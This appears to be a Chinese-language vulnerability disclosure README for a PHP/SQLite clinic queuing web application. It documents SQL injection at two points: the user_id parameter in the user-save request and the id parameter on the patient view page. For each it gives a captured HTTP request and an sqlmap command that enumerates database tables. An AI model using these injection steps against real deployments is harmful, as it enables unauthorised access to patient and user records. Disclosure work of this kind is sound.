# Clinic-Queuing-System
Clinic Queuing System Vulnerability exploitation
# 注入点1
功能点：Users->Add New

输入所有信息save并用burpsuite抓包
 ![image text](https://github.com/c1earyy/Clinic-Queuing-System/blob/main/2.png)
 ![image text](https://github.com/c1earyy/Clinic-Queuing-System/blob/main/3.png)
数据包
```
POST /php-sqlite-cqs/LoginRegistration.php?a=save_user HTTP/1.1
Host: 192.168.17.1
Content-Length: 143
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.17.1
Referer: http://192.168.17.1/php-sqlite-cqs/?page=manage_user
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=a5r847gtg31fcaj6bs2hk6991v
Connection: close

formToken=%242y%2410%24yN7Wr9kopiTJpbrSGGgaF.2Ufy.K9X2Sw1jaHwM1Z3HWM%2Fb.LYgwm&user_id=&fullname=yy&username=yy&password=123456&type=1&status=0
```

Sqlmap命令
```python
py .\sqlmap.py -r .\1.txt -p user_id –tables
```

user_id参数存在sql注入，成功注入到tables
 ![image text](https://github.com/c1earyy/Clinic-Queuing-System/blob/main/4.png)

# 注入点2
点击 +Add Record，填写好信息，save
 ![image text](https://github.com/c1earyy/Clinic-Queuing-System/blob/main/5.png)
功能点：Patient List->view patient
点击view patient之前打开burpsuite工具进行抓包
 ![image text](https://github.com/c1earyy/Clinic-Queuing-System/blob/main/6.png)
 ![image text](https://github.com/c1earyy/Clinic-Queuing-System/blob/main/7.png)
把抓到的数据包放进sqlmap工具里。

漏洞url
```
http://192.168.17.1/php-sqlite-cqs/?page=view_patient&id=23
```
Sqlmap命令
```python
py .\sqlmap.py -r .\1.txt -p id --tables –batch
```
id为sql注入参数，成功注入到tebles
 ![image text](https://github.com/c1earyy/Clinic-Queuing-System/blob/main/8.png)
